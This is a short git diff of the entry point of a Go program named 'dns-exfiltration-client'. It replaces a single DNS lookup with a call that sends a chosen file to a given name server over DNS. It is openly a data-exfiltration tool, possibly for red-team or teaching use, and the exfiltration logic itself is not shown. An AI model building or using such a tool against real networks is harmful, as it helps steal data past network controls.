@@ -1,10 +1,8 @@
 package main
 
 import (
-	"context"
+	"dns-exfiltration-client/exfiltrator"
 	"dns-exfiltration-client/parser"
-	"log"
-	"net"
 )
 
 const (
@@ -17,9 +15,6 @@ const (
 
 func main() {
 	args := parser.ParseArgs()
-
-	_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", args.Filename+"."+args.NameServer)
-	if err != nil {
-		log.Fatalln(err)
-	}
+	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(args.NameServer)
+	dnsExfiltrator.ExfiltrateFile(args.Filename)
 }
